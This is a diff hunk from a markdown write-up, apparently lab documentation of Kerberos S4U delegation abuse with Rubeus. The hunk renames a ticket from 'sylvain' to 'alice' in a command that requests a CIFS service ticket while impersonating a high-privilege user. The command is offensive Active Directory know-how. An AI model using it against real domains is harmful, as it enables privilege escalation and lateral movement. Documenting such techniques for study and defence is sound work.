@@ -256,7 +256,7 @@ Here `Rubeus` ask for `S4uSelf` ticket for himself (SA-TEST-01) and then ask a T
 Finally, we can ask a TGS for a sensible service using the ticket get from `s4u` that impersonate a high privilege user, and can act as a TGT!
 
 ```
-c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgs /ticket:sylvain_krbtgt_COSMOS /domain:COSMOS /dc:127.0.0.1 /service:cifs/WIN-P8AJE4ISDL7
+c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgs /ticket:alice_krbtgt_COSMOS /domain:COSMOS /dc:127.0.0.1 /service:cifs/WIN-P8AJE4ISDL7
 
    ______        _
   (_____ \      | |
